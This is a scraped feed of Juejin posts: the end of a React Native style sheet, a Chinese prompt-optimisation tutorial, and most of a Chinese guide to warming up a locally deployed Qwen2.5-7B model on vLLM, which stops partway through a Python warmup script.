    <span class="hljs-attr">borderRadius</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">9</span>),
    <span class="hljs-attr">paddingHorizontal</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-variable constant_">SPACING</span>.<span class="hljs-property">md</span>),
    <span class="hljs-attr">height</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">38</span>),
    <span class="hljs-attr">borderWidth</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">borderColor</span>: <span class="hljs-variable constant_">COLORS</span>.<span class="hljs-property">gray4</span>,
  },
  <span class="hljs-attr">input</span>: {
    <span class="hljs-attr">flex</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">14</span>),
    <span class="hljs-attr">color</span>: <span class="hljs-variable constant_">COLORS</span>.<span class="hljs-property">textPrimary</span>,
    <span class="hljs-attr">paddingVertical</span>: <span class="hljs-number">0</span>,
  },
  <span class="hljs-attr">closeButton</span>: {
    <span class="hljs-attr">width</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">24</span>),
    <span class="hljs-attr">height</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">24</span>),
    <span class="hljs-attr">borderRadius</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">12</span>),
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-variable constant_">COLORS</span>.<span class="hljs-property">gray1</span>,
    <span class="hljs-attr">alignItems</span>: <span class="hljs-string">'center'</span>,
    <span class="hljs-attr">justifyContent</span>: <span class="hljs-string">'center'</span>,
    <span class="hljs-attr">marginLeft</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">4</span>),
  },
  <span class="hljs-attr">closeText</span>: {
    <span class="hljs-attr">fontSize</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">16</span>),
    <span class="hljs-attr">color</span>: <span class="hljs-variable constant_">COLORS</span>.<span class="hljs-property">textSecondary</span>,
    <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'center'</span>,
    <span class="hljs-attr">lineHeight</span>: <span class="hljs-title function_">scaleLinear</span>(<span class="hljs-number">22</span>),
  },
});

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Prompt 优化教程]]></title>    <link>https://juejin.cn/post/7581619505584930867</link>    <guid>https://juejin.cn/post/7581619505584930867</guid>    <pubDate>2025-12-09T04:08:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505584930867" data-draft-id="7581412607061442606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Prompt 优化教程"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T04:08:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三秦赵哥"/> <meta itemprop="url" content="https://juejin.cn/user/4283353031519453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Prompt 优化教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353031519453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三秦赵哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:08:22.000Z" title="Tue Dec 09 2025 04:08:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">📘 Prompt优化教程</h2>
<h4 data-id="heading-1">1. Prompt 优化基础教程</h4>
<h6 data-id="heading-2">核心原则（4 条）</h6>
<ol>
<li>
<p><strong>明确（Clear）</strong></p>
<ul>
<li>
<p>避免模糊描述</p>
</li>
<li>
<p>给清晰输入、输出定义</p>
<p>❌ 差： “帮我写个脚本”<br/>
✔️ 好： “帮我写一个 Node.js 脚本：功能是从 MySQL 读取用户数据并导出到 CSV。不要使用 TypeScript。”</p>
</li>
</ul>
</li>
<li>
<p><strong>结构化（Structured）</strong><br/>
分段写 &gt; 一整段随便讲</p>
</li>
</ol>
<p>让模型更稳定。</p>
<pre><code class="hljs">任务：
步骤：
格式：
限制：
示例：
</code></pre>
<ol start="3">
<li>
<p><strong>角色（Role Assignment）</strong><br/>
模型以某种角色思考，会极大提升效果。</p>
<pre><code class="hljs">你是一名 Senior AI Engineer…
</code></pre>
</li>
<li>
<p><strong>多轮迭代（Iterative Prompting）</strong><br/>
Prompt 本身就是一个“反复迭代”的过程。</p>
<pre><code class="hljs">下面我给你初稿，请帮我指出缺陷，不要直接改。
</code></pre>
</li>
</ol>
<hr/>
<h4 data-id="heading-3">2. Prompt 万能模板</h4>
<pre><code class="hljs language-markdown" lang="markdown">你现在是 {角色}。
我需要你完成 {任务}。

请按照以下格式输出：
<span class="hljs-bullet">1.</span> 结论
<span class="hljs-bullet">2.</span> 分析过程
<span class="hljs-bullet">3.</span> 可选建议
<span class="hljs-bullet">4.</span> 示例（如适用）

必须遵守以下限制：
<span class="hljs-bullet">-</span> {限制 A}
<span class="hljs-bullet">-</span> {限制 B}

在回答前，请先问我 3 个关键问题来厘清需求。
</code></pre>
<p>这个模板适用于：</p>
<p>✔ 写代码</p>
<p>✔ 翻译/润色</p>
<p>✔ 生成知识内容</p>
<p>✔ 复杂推理</p>
<p>✔ 商业计划</p>
<p>✔ 专业领域讨论</p>
<hr/>
<h4 data-id="heading-4">3. Prompt 优化技巧（实战）</h4>
<h6 data-id="heading-5">技巧 1：提供示例（Few-shot）</h6>
<p>模型最擅长“模仿”。</p>
<pre><code class="hljs">示例输入：
xxx
示例输出：
yyy
现在根据我的文本：
{你的文本}
</code></pre>
<h6 data-id="heading-6">技巧 2：指定输出格式</h6>
<pre><code class="hljs language-json" lang="json">输出格式：
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"summary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"steps"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h6 data-id="heading-7">技巧 3：先思考再回答</h6>
<pre><code class="hljs">请先列出你对任务的理解与解决步骤，不要直接回答问题。
我确认后你再执行。
</code></pre>
<h6 data-id="heading-8">技巧 4：请模型评估 Prompt</h6>
<pre><code class="hljs">请从 Prompt 工程的角度分析我这个 Prompt 的缺陷。
然后提供一个改进版本。
</code></pre>
<h6 data-id="heading-9">技巧 5：限制模型自由度（减少幻觉）</h6>
<pre><code class="hljs">不要进行推测。
不要编造不存在的信息。
如果你无法确定，请回答：“信息不足”。
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大模型本地部署与预热全攻略：让首次响应速度提升 5 倍]]></title>    <link>https://juejin.cn/post/7581412607061803054</link>    <guid>https://juejin.cn/post/7581412607061803054</guid>    <pubDate>2025-12-09T04:51:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607061803054" data-draft-id="7581470169840615462" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大模型本地部署与预热全攻略：让首次响应速度提升 5 倍"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-12-09T04:51:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="lomocode"/> <meta itemprop="url" content="https://juejin.cn/user/2103792315926697"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大模型本地部署与预热全攻略：让首次响应速度提升 5 倍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2103792315926697/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    lomocode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:51:08.000Z" title="Tue Dec 09 2025 04:51:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1345198baac044c5ad125b3d6e789277~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9tb2NvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765860667&amp;x-signature=ZwISx6jlICtAum5FKF9ecD5Gtrs%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-0">故事的开始：收到咨询“预热怎么搞？”</h2>
<p>前不久收到咨询：“本地 vLLM 部署的模型，预热怎么做？首个 token 总是慢，有没有实战细节？”</p>
<p>我心想："vLLM 不是已经够快了吗？" 结果一查日志，首轮请求还是触发了模型加载、CUDA 内核 JIT、KV Cache 申请，GPU 还在掉电待机状态...难怪要等。</p>
<p>于是我专门记录了优化全过程并“肝”了本文，分享：<strong>如何在本地 GPU 上用 vLLM 部署大模型，并把预热做到极致，让用户一上线就感受到“秒回”的丝滑。</strong></p>
<hr/>
<h2 data-id="heading-1">首先，vLLM 是个啥？它适合跑哪些开源模型？</h2>
<p><strong>敲黑板：</strong> vLLM = 高性能推理引擎，核心是 PagedAttention + 连续批处理（continuous batching），原生支持 OpenAI 兼容接口。</p>
<p>吃苦耐劳的我进行了一番搜索并整理，目前社区里的模型热度排名（按公开版本常用度排序）如下：</p>
<ol>
<li>Qwen2.5 系列：7B/14B/32B/72B Instruct，中文/多语表现强，社区活跃度高</li>
<li>Llama 3.1：8B/70B Instruct，生态插件/量化多</li>
<li>Mixtral &amp; Mistral：Mistral Nemo 12B、Mixtral 8x7B、8x22B（MoE）</li>
<li>Yi 1.5：9B/34B Instruct，中文长文稳定</li>
<li>GLM-4 9B / ChatGLM3/4 6B/9B：对话/工具调用成熟</li>
<li>Gemma 2：9B/27B（指令版更好用）</li>
<li>Phi-3.5：mini/medium，极致性价比</li>
<li>量化变体：AWQ、GPTQ、GGUF（注意 flash-attn/rope 支持）</li>
</ol>
<h3 data-id="heading-2">模型选择指南：</h3>





























































<table><thead><tr><th>模型</th><th>参数量</th><th>显存需求(fp16)</th><th>中文能力</th><th>推理速度</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>Qwen2.5-Instruct</strong></td><td>7B/14B/32B/72B</td><td>14/28/64/144 GB</td><td>五星</td><td>快</td><td>通用对话、RAG</td></tr><tr><td><strong>Llama 3.1</strong></td><td>8B/70B</td><td>16/140 GB</td><td>三星</td><td>快</td><td>英文为主</td></tr><tr><td><strong>Yi-1.5</strong></td><td>9B/34B</td><td>18/68 GB</td><td>五星</td><td>快</td><td>长文本(200k)</td></tr><tr><td><strong>GLM-4</strong></td><td>9B</td><td>18 GB</td><td>五星</td><td>中</td><td>工具调用</td></tr><tr><td><strong>Mistral-Nemo</strong></td><td>12B</td><td>24 GB</td><td>三星</td><td>快</td><td>代码生成</td></tr><tr><td><strong>Mixtral-8x7B</strong></td><td>47B(MoE)</td><td>94 GB</td><td>三星</td><td>中</td><td>复杂推理</td></tr></tbody></table>
<p>以上排名和横评未必正确无误，如有出入，欢迎留言纠正！</p>
<p>本文记录的是使用单卡（RTX 3070 16GB 显存）、内存 64GB 跑 <code>Qwen/Qwen2.5-7B-Instruct</code> (fp16) 的实战过程，模型选择仅供参考，你可以根据需求选择模型。</p>
<blockquote>
<p><strong>为何选它？</strong> Qwen2.5-7B-Instruct 兼顾中文/多语体验、7B 体量适配 16GB 显存单卡，社区案例多、量化/部署资料丰富，易复制复现。</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">环境准备</h2>
<h3 data-id="heading-4">硬件与软件要求</h3>















































<table><thead><tr><th>组件</th><th>最低要求</th><th>推荐配置</th><th>本文测试环境</th></tr></thead><tbody><tr><td>GPU</td><td>8GB VRAM</td><td>16GB+ VRAM</td><td>RTX 3070 16GB</td></tr><tr><td>CUDA</td><td>11.8</td><td>12.1+</td><td>12.1</td></tr><tr><td>Driver</td><td>525.x</td><td>535+</td><td>535.183</td></tr><tr><td>Python</td><td>3.9</td><td>3.10/3.11</td><td>3.10</td></tr><tr><td>PyTorch</td><td>2.1.0</td><td>2.2.0+</td><td>2.2.1+cu121</td></tr><tr><td>RAM</td><td>32GB</td><td>64GB+</td><td>64GB</td></tr></tbody></table>
<h3 data-id="heading-5">创建虚拟环境</h3>
<pre><code class="hljs language-bash" lang="bash">python -m venv vllm_env
<span class="hljs-built_in">source</span> vllm_env/bin/activate  <span class="hljs-comment"># Linux/Mac</span>
<span class="hljs-comment"># vllm_env\Scripts\activate   # Windows</span>
</code></pre>
<h3 data-id="heading-6">安装核心依赖（自动匹配 CUDA 版本）</h3>
<p>pip install torch==2.2.1 --index-url <a href="https://link.juejin.cn?target=https%3A%2F%2Fdownload.pytorch.org%2Fwhl%2Fcu121" target="_blank" title="https://download.pytorch.org/whl/cu121" ref="nofollow noopener noreferrer">download.pytorch.org/whl/cu121</a>
pip install "vllm&gt;=0.5.0" "transformers&gt;=4.40.0"
pip install "openai&gt;=1.40.0" "huggingface_hub&gt;=0.22.0"
pip install matplotlib pandas  # 用于性能分析</p>
<h3 data-id="heading-7">可选：Flash Attention（显著加速）</h3>
<p>pip install flash-attn --no-build-isolation</p>
<hr/>
<h2 data-id="heading-8">① 以为“启动 = 上线”，被「首 token」 上了一课</h2>
<p>我信心满满地敲下：</p>
<pre><code class="hljs language-bash" lang="bash">python -m vllm.entrypoints.openai.api_server \
  --model Qwen/Qwen2.5-7B-Instruct \
  --host 0.0.0.0 --port 8000 \
  --gpu-memory-utilization 0.9 \
  --max-model-len 4096
</code></pre>
<p>（提示：若模型需从 Hugging Face 拉取，先 <code>huggingface-cli login</code> 或设置 <code>HF_TOKEN</code>；如 16GB 显存仍吃紧，可把 <code>--gpu-memory-utilization</code> 调低至 0.88 或把 <code>--max-model-len</code> 下调到 3072。）</p>
<p>端口通了，健康检查 OK，发第一条请求：</p>
<pre><code class="hljs">TTFT（首 token 延迟）：5~6s
</code></pre>
<p>第二条请求：</p>
<pre><code class="hljs">TTFT：≈1s
</code></pre>
<p>差距一眼明了：<strong>冷启动伤不起</strong>。</p>
<hr/>
<h2 data-id="heading-9">② 翻日志才知道，预热要触发的东西太多了</h2>
<p>冷启动的隐形成本：</p>
<ul>
<li>分词器懒加载：第一条中文/符号混合 prompt 最慢</li>
<li>CUDA kernel JIT：flash-attn、rope、rmsnorm 等都要编译</li>
<li>KV Cache 申请：长 prompt 会触发大页分配</li>
<li>调度器初始化：continuous batching 的批次合并要先跑一遍</li>
<li>GPU 掉电：没开 nvidia-persistenced，GPU 频率慢慢爬</li>
</ul>
<p>目标很明确：<strong>把这些成本提前花掉</strong>。</p>
<hr/>
<h2 data-id="heading-10">③ 设计预热策略，覆盖“长短胖瘦”所有姿势</h2>
<p>我列了一张预热覆盖表：</p>



































<table><thead><tr><th>维度</th><th>要覆盖什么</th><th>目的</th></tr></thead><tbody><tr><td>Prompt 长度</td><td>32 / 256 / 1024+</td><td>触发分词缓存、KV 大页申请</td></tr><tr><td>输出长度</td><td>32 / 128</td><td>让 decode 内核 JIT 完整</td></tr><tr><td>并发</td><td>4 / 8 / 16</td><td>让调度器、连续批次稳定</td></tr><tr><td>语料类型</td><td>中/英/符号混合</td><td>填满分词 cache，避免首条中文慢</td></tr><tr><td>特殊路径</td><td>流式 / 非流式</td><td>SSE/HTTP chunking 都走一遍</td></tr></tbody></table>
<p>预热脚本要“一次打穿”这些组合，不能只发一条短 prompt。</p>
<hr/>
<p>李牛子前辈说：“Talk is cheap. Show me the code.”
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b3557c2cd6443fca4fc49b765b2f3bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9tb2NvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765860667&amp;x-signature=oJs3yajIf8xRbxMcAP%2Fnx9XlGrs%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>好吧！</p>
<h2 data-id="heading-11">④ 上代码：预热脚本</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># warmup_vllm.py</span>
<span class="hljs-keyword">import</span> asyncio, time, sys
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> AsyncOpenAI

client = AsyncOpenAI(
    base_url=<span class="hljs-string">"http://127.0.0.1:8000/v1"</span>,
    api_key=<span class="hljs-string">"not-used"</span>,
    timeout=<span class="hljs-number">30</span>,
)

base_prompts = [
    <span class="hljs-string">"用 3 点概括 Transformer 的核心思想。"</span>,
    <span class="hljs-string">"Write a concise intro to CUDA graph capture for attention kernels."</span>,
    <span class="hljs-string">"给出一篇 1200 字的综述：vLLM 的调度、KV Cache 分页与连续批次。"</span>,
    <span class="hljs-string">"Symbols: $$$ *** ### 混合一下 tokenizer 缓存。"</span>,
]

length_pairs = [(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>), (<span class="hljs-number">256</span>, <span class="hljs-number">64</span>), (<span class="hljs-number">1024</span>, <span class="hljs-number">128</span>)]  <span class="hljs-comment"># (target_prompt_len, max_tokens)</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">make_prompt_with_length</span>(<span class="hljs-params">base_prompt, target_len</span>):
